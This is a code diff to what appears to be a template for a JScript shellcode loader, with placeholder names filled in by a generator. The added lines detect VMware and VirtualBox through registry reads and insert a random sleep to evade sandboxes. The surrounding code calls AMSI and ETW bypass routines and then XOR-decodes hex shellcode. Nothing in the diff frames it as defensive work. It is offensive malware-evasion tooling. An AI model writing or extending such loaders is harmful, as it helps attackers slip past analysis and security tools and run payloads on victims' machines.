@@ -39,6 +39,17 @@
                 for (var i = 0; i < bad.length; i++) { if (n === bad[i]) return true; }
             }
         } catch(e) {}
+        // VM registry checks
+        try {
+            var sh = new ActiveXObject("WScript.Shell");
+            sh.RegRead("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\\InstallPath");
+            return true;
+        } catch(e) {}
+        try {
+            var sh2 = new ActiveXObject("WScript.Shell");
+            sh2.RegRead("HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\\Version");
+            return true;
+        } catch(e) {}
         return false;
     }
 
@@ -56,6 +67,7 @@
 
     function {{ v.fn_run }}() {
         if ({{ v.fn_sandbox }}()) return;
+        WScript.Sleep(2000 + Math.floor(Math.random() * 3000));
         {{ v.fn_amsi }}();
         {{ v.fn_etw }}();
         var sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"), {{ v.fn_hex }}("{{ key_hex }}"));
